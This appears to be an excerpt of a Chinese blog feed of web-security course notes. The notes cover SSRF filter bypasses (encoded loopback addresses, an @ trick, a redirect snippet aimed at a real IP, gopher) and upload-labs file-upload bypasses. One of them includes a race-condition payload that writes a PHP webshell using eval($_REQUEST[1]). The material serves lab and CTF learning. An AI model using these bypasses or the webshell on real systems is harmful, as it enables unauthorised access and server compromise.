+<h1 id="五、SSRF绕过方式"><a href="#五、SSRF绕过方式" class="headerlink" title="五、SSRF绕过方式"></a>五、SSRF绕过方式</h1><p>-限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<p>采用http基本身份认证的方式绕过，即@</p>
+<p><a href="http://www.xxx.com@www.xxyy.com/">http://www.xxx.com@www.xxyy.com</a></p>
+<p>-限制请求IP不为内网地址</p>
+<p>当不允许ip为内网地址时：</p>
+<p>（1）采取短网址绕过</p>
+<p>（2）采取域名解析</p>
+<p>（3）采取进制转换</p>
+<p>（4）采取3XX重定向</p>
+<h1 id="六、SSRF漏洞防御"><a href="#六、SSRF漏洞防御" class="headerlink" title="六、SSRF漏洞防御"></a>六、SSRF漏洞防御</h1><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。</p>
+<p>2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+<h1 id="七、SSRF过滤绕过"><a href="#七、SSRF过滤绕过" class="headerlink" title="七、SSRF过滤绕过"></a>七、SSRF过滤绕过</h1><p>CTFSHOW 白盒，ctfshow的vip太贵了我就不演示了，</p>
+<p><a href="https://blog.csdn.net/2301_80027701/article/details/153080961">https://blog.csdn.net/2301_80027701&#x2F;article&#x2F;details&#x2F;153080961</a></p>
+<p>1、无过滤直接获取</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
+<p>2-3、IP地址进制绕过</p>
+<p>十六进制</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p>
+<p>八进制</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a></p>
+<p>10 进制整数格式</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a></p>
+<p>16 进制整数格式，还是上面那个网站转换记得前缀0x</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a></p>
+<p>还有一种特殊的省略模式</p>
+<p>127.0.0.1写成127.1</p>
+<p>用CIDR绕过localhost</p>
+<p>url&#x3D;<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a></p>
+<p>还有很多方式</p>
+<p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+<p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
+<p>4、域名解析IP绕过</p>
+<p>test.xiaodi8.com-&gt;127.0.0.1</p>
+<p>url&#x3D;<a href="http://test.xiaodi8.com/flag.php">http://test.xiaodi8.com/flag.php</a></p>
+<p>5、长度限制IP绕过</p>
+<p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
+<p>6、长度限制IP绕过</p>
+<p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
+<p>7、利用重定向解析绕过</p>
+<?php
+
+header("Location:http://127.0.0.1/flag.php");
+
+url=http://47.94.236.117/xx.php
+
+
+
+8、匹配且不影响写法解析
+
+url=http://ctf.@127.0.0.1/flag.php?show
+
+
+
+9-10、利用gopher协议打服务
+
+参考上述工具项目
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第66天-SSRF服务端伪造&amp;功能逻辑&amp;SRC实践复盘&amp;参数盲测&amp;自动化检测&amp;流量插件</title>
+    <url>/2026/09/10/%E7%AC%AC66%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E5%8A%9F%E8%83%BD%E9%80%BB%E8%BE%91-SRC%E5%AE%9E%E8%B7%B5%E5%A4%8D%E7%9B%98-%E5%8F%82%E6%95%B0%E7%9B%B2%E6%B5%8B-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B-%E6%B5%81%E9%87%8F%E6%8F%92%E4%BB%B6/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+<h1 id="一、功能逻辑挖掘："><a href="#一、功能逻辑挖掘：" class="headerlink" title="一、功能逻辑挖掘："></a>一、功能逻辑挖掘：</h1><p>视频解析，格式转换，代码执行，在线笔记，数据采集等</p>
+<h1 id="二、参数盲测挖掘："><a href="#二、参数盲测挖掘：" class="headerlink" title="二、参数盲测挖掘："></a>二、参数盲测挖掘：</h1><p><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></p>
+<p>借助HaE规则找到数据包配合测试，高亮显示配合手工测试，解决：测试参数值会不会带入ssrf</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/066-1.png"></p>
+<p>这个插件之前也讲过，就是遇到敏感信息就高亮，规则可以自己去定</p>
+<p>1、Burp安装插件HaE</p>
+<p>2、HaE规则配置文件修改</p>
+<p>3、配置插件选项开启使用</p>
+<h1 id="三、检测插件："><a href="#三、检测插件：" class="headerlink" title="三、检测插件："></a>三、检测插件：</h1><p><a href="https://github.com/banchengkemeng/Auto-SSRF">https://github.com/banchengkemeng/Auto-SSRF</a></p>
+<p>配置使用：</p>
+<p>参考：<a href="https://mp.weixin.qq.com/s/99pPa1jrLR1t7_x40eH8TQ">https://mp.weixin.qq.com/s/99pPa1jrLR1t7_x40eH8TQ</a></p>
+<p>全自动分析加测试</p>
+<p>1、Burp安装插件Auto-SSRF</p>
+<p>2、Collaborator配置和开启</p>
+<p>主要就是collaborator的服务器配置，找了半天才找到一个能用的，还是用的上面文章的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/066-2.png"></p>
+<p>3、配置插件选项开启监听使用</p>
+<p>案例：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/066-3.jpg"></p>
+<p>这个网站pdf转txt这里存在ssrf漏洞，但是我自己复现的时候发现它已经修复了，原本能通过file伪协议读到敏感内容的</p>
+<p>这个就是通过bp插件搞出来的，我们就负责在可能存在漏洞的功能点去点点点</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/066-4.png"></p>
+<h1 id="四、其他案例："><a href="#四、其他案例：" class="headerlink" title="四、其他案例："></a>四、其他案例：</h1><p><a href="https://mp.weixin.qq.com/s/63fC5STI5WAKn7O6c02kyQ">https://mp.weixin.qq.com/s/63fC5STI5WAKn7O6c02kyQ</a> </p>
+<p><a href="https://mp.weixin.qq.com/s/zXH3nudCY1VEj8AFMgwwXQ">https://mp.weixin.qq.com/s/zXH3nudCY1VEj8AFMgwwXQ</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第67&amp;68天-文件上传&amp;黑白名单&amp;MIME&amp;JS泄露&amp;执行权限&amp;编码解析&amp;OSS存储&amp;分域名&amp;条件竞争&amp;JS泄露&amp;开源审计漏洞&amp;编辑器安全&amp;思维体系&amp;SRC复盘</title>
+    <url>/2026/09/10/%E7%AC%AC67-68%E5%A4%A9-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95-MIME-JS%E6%B3%84%E9%9C%B2-%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90-%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90-OSS%E5%AD%98%E5%82%A8-%E5%88%86%E5%9F%9F%E5%90%8D-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-JS%E6%B3%84%E9%9C%B2-%E5%BC%80%E6%BA%90%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E-%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8-%E6%80%9D%E7%BB%B4%E4%BD%93%E7%B3%BB-SRC%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-文件上传-安全验证&amp;层面逻辑</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-文件上传-执行权限&amp;解码还原</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-文件上传-分站存储&amp;OSS存储</font></p>
+<p><font style="color:#708090;"></font></p>
+<h1 id="一、常规文件上传"><a href="#一、常规文件上传" class="headerlink" title="一、常规文件上传"></a>一、常规文件上传</h1><p>1、课前一定要明白：</p>
+<p>无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）</p>
+<p>换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析</p>
+<p>2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！</p>
+<p>1、无限制</p>
+<p>任意上传，什么文件都能上传</p>
+<p>2、有限制：</p>
+<p>限制后缀格式（判断后缀名（黑白名单），MIME类型，文件头等）</p>
+<p>3、测试环境安装参考：</p>
+<p><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a> 自动化环境部署工具</p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a>渗透测试字典全家桶</p>
+<p><a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a>文件上传靶场</p>
+<p><a href="https://github.com/sqlsec/upload-labs-docker/blob/main/WP.md">https://github.com/sqlsec/upload-labs-docker/blob/main/WP.md</a>wp在这里</p>
+<p>下载上述资源</p>
+<p>docker安装</p>
+<p>f8x -d 或 f8x -docker</p>
+<p>进入项目文件夹</p>
+<p>cd upload-labs-docker</p>
+<p>一键部署运行</p>
+<p>docker-compose up -d</p>
+<h2 id="1、第一关-前端JS"><a href="#1、第一关-前端JS" class="headerlink" title="1、第一关(前端JS)"></a>1、第一关(前端JS)</h2><p>如何判断是否是前端验证呢？</p>
+<p>首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了</p>
+<p>前端js验证代码审计：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/067&068-1.png"></p>
+<p>enctype&#x3D;”multipart&#x2F;form-data”(上传文件必写)，作用就是告诉浏览器这个表单要传文件</p>
+<p>on-xxx都是事件：onsubmit提交事件，onclick点击事件，onchange改变事件，onmouseover鼠标悬浮。事件就是触发开关，使得HTML和js联动。</p>
+<details class="lake-collapse"><summary id="u34061673"><span class="ne-text" style="font-size: 24px">js代码</span></summary><p id="u9a7783cb" class="ne-p"><span class="ne-text" style="font-size: 24px">function checkfilesuffix()</span></p><p id="ud9e25f94" class="ne-p"><span class="ne-text" style="font-size: 24px">{</span></p><p id="u2f6761ea" class="ne-p"><span class="ne-text" style="font-size: 24px">    var file=document.getElementsByName('file')[0]['value'];</span></p><p id="ua788fef4" class="ne-p"><span class="ne-text" style="font-size: 24px">/*这里是一个dom操作document.getElementsByName('file')</span></p><p id="u07537fbc" class="ne-p"><span class="ne-text" style="font-size: 24px">通过name找标签，elements带s，返回数组（多个标签列表），[0]数组从0开始，取第一个上传框，value是上传框自带属性，存你选中的文件路径加文件名*/</span></p><p id="u007b06bd" class="ne-p"><span class="ne-text" style="font-size: 24px">    if(file==&quot;&quot;||file==null)</span></p><p id="u5b0ce487" class="ne-p"><span class="ne-text" style="font-size: 24px">    {</span></p><p id="u659a7366" class="ne-p"><span class="ne-text" style="font-size: 24px">        swal(&quot;请添加上传文件&quot;, &quot;&quot;, &quot;error&quot;);</span></p><p id="ucb1757c3" class="ne-p"><span class="ne-text" style="font-size: 24px">//这就是一个弹窗，相当于alert的升级版，更好看</span></p><p id="uebf60d1c" class="ne-p"><span class="ne-text" style="font-size: 24px">        return false;</span></p><p id="u47eeec9b" class="ne-p"><span class="ne-text" style="font-size: 24px">//直接告诉浏览器：不要提交表单，终止上传</span></p><p id="u05a0338d" class="ne-p"><span class="ne-text" style="font-size: 24px">    }</span></p><p id="u9b565607" class="ne-p"><span class="ne-text" style="font-size: 24px">    else</span></p><p id="ue428da4a" class="ne-p"><span class="ne-text" style="font-size: 24px">    {</span></p><p id="u4c8f6531" class="ne-p"><span class="ne-text" style="font-size: 24px">        var whitelist=new Array(&quot;.jpg&quot;,&quot;.png&quot;,&quot;.gif&quot;,&quot;.jpeg&quot;);</span></p><p id="u3488d5a8" class="ne-p"><span class="ne-text" style="font-size: 24px">        var file_suffix=file.substring(file.lastIndexOf(&quot;.&quot;));、</span></p><p id="u75b18d0a" class="ne-p"><span class="ne-text" style="font-size: 24px">/*substring(起始下标)从指定下标开始，截取字符串后面所有内容，lastIndexOf（&quot;.&quot;）找到字符串里最后一个小数点的位置，返回下标*/</span></p><p id="u2e97e0ac" class="ne-p"><span class="ne-text" style="font-size: 24px">        if(whitelist.indexOf(file_suffix) == -1)</span></p><p id="ue5068604" class="ne-p"><span class="ne-text" style="font-size: 24px">//indexOf()在一个数组/字符串里，查找某个内容，返回它的位置(下标)</span></p><p id="uc7b905e6" class="ne-p"><span class="ne-text" style="font-size: 24px">        {</span></p><p id="ua2207320" class="ne-p"><span class="ne-text" style="font-size: 24px">            swal(&quot;只允许上传图片类型的文件!&quot;, &quot;&quot;, &quot;error&quot;);</span></p><p id="u535c86d8" class="ne-p"><span class="ne-text" style="font-size: 24px">            return false;</span></p><p id="u9a120c9c" class="ne-p"><span class="ne-text" style="font-size: 24px">        }</span></p><p id="u54ade980" class="ne-p"><span class="ne-text" style="font-size: 24px">    }</span></p><p id="u8b0a0855" class="ne-p"><span class="ne-text" style="font-size: 24px">}</span></p><p id="u0b8a501c" class="ne-p"><span class="ne-text" style="font-size: 24px"></span></p><p id="uff4621a5" class="ne-p"><span class="ne-text" style="font-size: 24px">function error(){</span></p><p id="u42ea92ac" class="ne-p"><span class="ne-text" style="font-size: 24px">    swal(&quot;上传失败&quot;, &quot;&quot;, &quot;error&quot;);</span></p><p id="u5f1b9eac" class="ne-p"><span class="ne-text" style="font-size: 24px">}</span></p><p id="u2560a481" class="ne-p"><span class="ne-text" style="font-size: 24px"></span></p><p id="u27945fa6" class="ne-p"><br></p></details>
+
+
+
+
+<p>绕过方法：</p>
+<p>判断是前端验证还是后端验证可以通过抓包，能抓到就是传到后端了，抓不到就是没传到服务器是前端验证。可以先把文件换为合法后缀，通过bp抓包后改后缀之后就把目标文件传到服务器了</p>
+<h2 id="2、第二关-htaccess"><a href="#2、第二关-htaccess" class="headerlink" title="2、第二关(.htaccess)"></a>2、第二关(.htaccess)</h2><p>AddType application&#x2F;x-httpd-php .png</p>
+<details class="lake-collapse"><summary id="u556283d5"><span class="ne-text" style="font-size: 24px">后端代码</span></summary><pre data-language="php" id="Iogey" class="ne-codeblock language-php"><code>header(&quot;Content-type: text/html;charset=utf-8&quot;);
+
+<p>&#x2F;&#x2F;设置 HTTP 响应头，告诉浏览器页面是 HTML 格式、使用 UTF-8 编码，防止中文乱码。</p>
+<pre><code>    error_reporting(0);
+</code></pre>
+<p>&#x2F;&#x2F;关闭所有 PHP 错误提示（警告、报错、通知都不显示）。</p>
+<pre><code>    //设置上传目录
+    define(&amp;quot;UPLOAD_PATH&amp;quot;, dirname(__FILE__) . &amp;quot;/upload/&amp;quot;);
+</code></pre>
+<p>&#x2F;<em>dirname(<strong>FILE</strong>) &#x3D; 当前 PHP 文件所在的绝对路径<br>定义常量 UPLOAD_PATH &#x3D; 当前目录下的 &#x2F;upload&#x2F; 文件夹绝对路径<br>示例：&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;</em>&#x2F;</p>
+<pre><code>    define(&amp;quot;UPLOAD_URL_PATH&amp;quot;, str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;], &amp;quot;&amp;quot;, UPLOAD_PATH));
+</code></pre>
+<p>&#x2F;&#x2F;str_replace(要去掉什么，换成什么，原字符串)，$_SERVER[‘DOCUMENT_ROOT’]网站根目录</p>
+<pre><code>    if (!file_exists(UPLOAD_PATH)) &#123;
+        mkdir(UPLOAD_PATH, 0755);
+    &#125;
+
+    $is_upload = false;
+    if (!empty($_POST[&#39;submit&#39;])) &#123;
+        $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);
+      //获取文件名，去掉前面的路径
+        $ext = pathinfo($name)[&#39;extension&#39;];
+      //pathinfo(文件名)解析文件名，取各种信息。[&#39;extension&#39;]专门拿文件后缀
+        $blacklist = array(&amp;quot;php&amp;quot;, &amp;quot;php7&amp;quot;, &amp;quot;php5&amp;quot;, &amp;quot;php4&amp;quot;, &amp;quot;php3&amp;quot;, &amp;quot;phtml&amp;quot;, &amp;quot;pht&amp;quot;, &amp;quot;jsp&amp;quot;, &amp;quot;jspa&amp;quot;, &amp;quot;jspx&amp;quot;, &amp;quot;jsw&amp;quot;, &amp;quot;jsv&amp;quot;, &amp;quot;jspf&amp;quot;, &amp;quot;jtml&amp;quot;, &amp;quot;asp&amp;quot;, &amp;quot;aspx&amp;quot;, &amp;quot;asa&amp;quot;, &amp;quot;asax&amp;quot;, &amp;quot;ascx&amp;quot;, &amp;quot;ashx&amp;quot;, &amp;quot;asmx&amp;quot;, &amp;quot;cer&amp;quot;, &amp;quot;swf&amp;quot;);
+        if (!in_array($ext, $blacklist)) &#123;
+            if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . $name)) &#123;
+                $is_upload = true;
+            &#125; else &#123;
+                echo &amp;quot;&amp;lt;script&amp;gt;error();&amp;lt;/script&amp;gt;&amp;quot;;
+            &#125;
+        &#125; else &#123;
+            echo &amp;quot;&amp;lt;script&amp;gt;black();&amp;lt;/script&amp;gt;&amp;quot;;
+        &#125;
+    
+    &#125;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;u4aafcd55&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot; style=&quot;font-size: 24px&quot;&gt;代码审计发现没过滤.htaccess,并且网站还是Apache+php搭建，所以可利用.htaccess配置文件来绕过&lt;/span&gt;&lt;/p&gt;&lt;/details&gt;
+</code></pre>
+<p><a href="https://blog.csdn.net/weixin_46684578/article/details/119141109">https://blog.csdn.net/weixin_46684578&#x2F;article&#x2F;details&#x2F;119141109</a></p>
+<p>AddType application&#x2F;x-httpd-php .png</p>
+<p>addtype告诉Apache服务器，新增文件后缀对应的解析类型</p>
+<p>application：mime类型大类，表示这是可执行应用程序，不是普通文本或图片</p>
+<p>x-httpd-php专门给Apache web服务器用的PHP解析器</p>
+<p>.htaccess修改解析配置文件</p>
+<p>借助这个配置让.png的命名文件做类型application&#x2F;x-httpd-php(PHP的类型)当做PHP执行</p>
+<p>非靶场步骤：先看是不是用apache搭建的，其次看网站用什么语言开发，之后就可以正常测试</p>
+<h2 id="3、第三关-MIME类型"><a href="#3、第三关-MIME类型" class="headerlink" title="3、第三关(MIME类型)"></a>3、第三关(MIME类型)</h2><p>Content-Type：image&#x2F;png</p>
+<details class="lake-collapse"><summary id="u59594c6d"><span class="ne-text" style="font-size: 24px">后端代码</span></summary><pre data-language="php" id="Jq7FX" class="ne-codeblock language-php"><code>&lt;?php
+        header(&quot;Content-type: text/html;charset=utf-8&quot;);
+        error_reporting(0);
+        //设置上传目录
+        define(&quot;UPLOAD_PATH&quot;, dirname(__FILE__) . &quot;/upload/&quot;);
+        define(&quot;UPLOAD_URL_PATH&quot;, str_replace($_SERVER['DOCUMENT_ROOT'], &quot;&quot;, UPLOAD_PATH));
+        if (!file_exists(UPLOAD_PATH)) &#123;
+            mkdir(UPLOAD_PATH, 0755);
+        &#125;
+        $is_upload = false;
+        if (!empty($_POST['submit'])) &#123;
+            if (!in_array($_FILES['file']['type'], [&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/jpg&quot;])) &#123;
+                echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;
+            &#125; else &#123;
+                $name = basename($_FILES['file']['name']);
+                if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) &#123;
+                    $is_upload = true;
+                &#125; else &#123;
+                    echo &quot;&lt;script&gt;alert('上传失败')&lt;/script&gt;&quot;;
+                &#125;
+            &#125;
+        &#125;
+    ?&gt;</code></pre><p id="u66b0a095" class="ne-p"><span class="ne-text" style="font-size: 24px">可以看出来这是MIME后端验证的</span></p></details>
+网站过滤逻辑是通过MIME类型过滤，我们可以先把目标文件改为允许上传的文件后缀，我们上传抓包后再改掉后缀即可过滤，文件上传后执行，看的是后缀加中间件解析规则，不看MIME
+
+
+
+<h2 id="4、第四关-文件头判断"><a href="#4、第四关-文件头判断" class="headerlink" title="4、第四关(文件头判断)"></a>4、第四关(文件头判断)</h2><p>GIF89a</p>
+<details class="lake-collapse"><summary id="u2cf2c13b"><span class="ne-text" style="font-size: 24px">代码审计</span></summary><pre data-language="php" id="EYQ4h" class="ne-codeblock language-php"><code>// 1. 判断是否通过POST方式提交了名为submit的表单数据，且不为空
+if (!empty($_POST['submit'])) &#123;
+    // 2. 判断上传文件的大小是否为0（空文件）
+    if (!$_FILES['file']['size']) &#123;
+        // 3. 前端执行error() JS函数，提示上传错误
+        echo &quot;&lt;script&gt;error();&lt;/script&gt;&quot;;
+    &#125; else &#123;
+        // 4. 以二进制只读模式打开上传的临时文件
+        $file = fopen($_FILES['file']['tmp_name'], &quot;rb&quot;);
+        // 5. 读取临时文件的前4个字节（二进制数据）
+        $bin = fread($file, 4);
+        // 6. 关闭打开的文件句柄，释放资源
+        fclose($file);
+        
+<pre><code>    // 7. 校验文件MIME类型，是否为指定图片类型
+    if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&amp;quot;image/jpeg&amp;quot;, &amp;quot;image/jpg&amp;quot;, &amp;quot;image/png&amp;quot;, &amp;quot;image/gif&amp;quot;])) &#123;
+        // 8. 前端执行black() JS函数，非法文件拦截
+        echo &amp;quot;&amp;lt;script&amp;gt;black();&amp;lt;/script&amp;gt;&amp;quot;;
+    &#125; 
+    // 9. 校验文件头（前4字节转16进制），匹配图片文件头
+    else if (!in_array(bin2hex($bin), [&amp;quot;89504E47&amp;quot;, &amp;quot;FFD8FFE0&amp;quot;, &amp;quot;47494638&amp;quot;])) &#123;
+        // 10. 非法文件头，拦截
+        echo &amp;quot;&amp;lt;script&amp;gt;black();&amp;lt;/script&amp;gt;&amp;quot;;
+    &#125; 
+    // 11. 校验全部通过，处理文件上传
+    else &#123;
+        // 12. 获取上传文件的原始文件名（过滤路径，只保留文件名）
+        $name = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);
+        // 13. 将临时文件移动到指定上传目录
+        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . $name)) &#123;
+            // 14. 上传成功标记
+            $is_upload = true;
+        &#125; else &#123;
+            // 15. 移动文件失败，提示错误
+            echo &amp;quot;&amp;lt;script&amp;gt;error();&amp;lt;/script&amp;gt;&amp;quot;;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>}</code></pre><p id="u8fb04af7" class="ne-p"><span class="ne-text" style="font-size: 24px">通过代码审计可知，文件验证时MIME类型和读文件开头前四个字节，配合010editor工具。后门文件前面写GIF89a gif文件的前几个字符</span></p></details><br>网站绕过逻辑是直接读文件开头几个字节，因为前面一串字节是代表着文件后缀，但是改MIME类型就上传成功了，这里有疑问。这是要在目标文件内前面加上jpg或其他的文件头前几个字节头，然后搭配mima类型就能绕过</p>
+<h2 id="5、第五关-黑名单-过滤不严"><a href="#5、第五关-黑名单-过滤不严" class="headerlink" title="5、第五关(黑名单-过滤不严)"></a>5、第五关(黑名单-过滤不严)</h2><p>无递归，pphphp</p>
+<details class="lake-collapse"><summary id="ufc63db2b"><span class="ne-text" style="font-size: 24px">代码审计</span></summary><p id="uc1837ae5" class="ne-p"><br></p><pre data-language="php" id="gIV9X" class="ne-codeblock language-php"><code>$is_upload = false;
+        if (!empty($_POST['submit'])) &#123;
+            $name = basename($_FILES['file']['name']);
+            $blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);
+            
+<pre><code>        $name = str_ireplace($blacklist, &amp;quot;&amp;quot;, $name);
+    
+        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . $name)) &#123;
+            $is_upload = true;
+        &#125; else &#123;
+            echo &amp;quot;&amp;lt;script&amp;gt;error();&amp;lt;/script&amp;gt;&amp;quot;;
+        &#125;
+    &#125;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;ua50bba66&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot; style=&quot;font-size: 24px&quot;&gt;通过代码审计可知，代码只执行一次，没有循环遍历，所以可以双写绕过例如.pphphp，str_ireplace()函数不区分大小写&lt;/span&gt;&lt;/p&gt;&lt;/details&gt;
+</code></pre>
+<p>通过文件后缀判断文件后缀</p>
+<p>1、黑名单</p>
+<p>检测文件上传后缀是不是在黑名单，在就gg不在就通过</p>
+<p>2、白名单</p>
+<p>检测上传文件后缀是不是在白名单，在就通过不在就gg</p>
+<p>这关和第一关的区别是，这一关是后端严格验证，不能通过抓包绕。</p>
+<p>通过源代码可以看出它没有递归，只检测一次我们把后缀写成pphphp,后端会把PHP删掉剩下还是php（双写绕过）</p>
+<h2 id="6、第六关-黑名单-过滤不严"><a href="#6、第六关-黑名单-过滤不严" class="headerlink" title="6、第六关(黑名单-过滤不严)"></a>6、第六关(黑名单-过滤不严)</h2><p>系统大小写敏感属性</p>
+<p>代码和上一关基本一样，只不过替换函数str_replace()它区分大小写所以可直接绕过</p>
+<p>这一关黑白名单还是一样，这一关就是大小写问题可以绕过，windows服务器不区分大小写，linux会严格区分，linux就不行了</p>
+<h2 id="7、第七关-低版本GET-00截断"><a href="#7、第七关-低版本GET-00截断" class="headerlink" title="7、第七关(低版本GET-%00截断)"></a>7、第七关(低版本GET-%00截断)</h2><p>自动解码一次</p>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;x.php%00</p>
+<p>这个漏洞是php小于5.3.4以下才有的漏洞（00截断）</p>
+<p>一种是改文件后缀:shell.php%00.jpg，黑白名单验证后缀顺利通过，但是保存文件时会受影响然后.jpg失效</p>
+<p>一种是改文件保存路径shell.php%00,文件正常为shell.jpg但是在保存的时候还是会变为php</p>
+<h2 id="8、第八关-低版本POST-00截断"><a href="#8、第八关-低版本POST-00截断" class="headerlink" title="8、第八关(低版本POST-%00截断)"></a>8、第八关(低版本POST-%00截断)</h2><p>手工解码一次</p>
+<p>..&#x2F;upload&#x2F;x.php%00 二次解码</p>
+<p>考点和第七关大部分一样</p>
+<p>00截断是%00解码后的结果</p>
+<p>url上面%00会自动解码一次</p>
+<p>post下面%00手工解码一次</p>
+<h2 id="9、第九关-黑名单-过滤不严"><a href="#9、第九关-黑名单-过滤不严" class="headerlink" title="9、第九关(黑名单-过滤不严)"></a>9、第九关(黑名单-过滤不严)</h2><p>php3</p>
+<p>可以通过fuzzdb里面关于文件上传字典来过滤，因为很多写法可以解析成你目标后缀</p>
+<h2 id="10、逻辑不严-条件竞争"><a href="#10、逻辑不严-条件竞争" class="headerlink" title="10、逻辑不严-条件竞争"></a>10、逻辑不严-条件竞争</h2><p><font style="color:#81BBF8;">这个一般是通过代码审计才能发现这个漏洞。</font></p>
+<p><font style="color:#81BBF8;">代码逻辑：</font></p>
+<p><font style="color:#81BBF8;">1、上传1.php</font></p>
+<p><font style="color:#81BBF8;">2、1.php存储到upload</font></p>
+<p><font style="color:#81BBF8;">3、发现1.php不是合法的后缀</font></p>
+<p><font style="color:#81BBF8;">4、删除1.php</font></p>
+<p><font style="color:#81BBF8;">原理：在1.php被删除之前触发代码</font></p>
+<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?><p>‘);?&gt;</p>
+<p>上传不断发包</p>
+<p>请求不断发包</p>
+<h2 id="11、二次渲染"><a href="#11、二次渲染" class="headerlink" title="11、二次渲染"></a>11、二次渲染</h2><p>先搞个正常图片，上传导出渲染后的图片</p>
+<p>对比保留部分，在保留部分添加后门代码</p>
+<p>最后利用提示的文件包含执行图片后门代码</p>
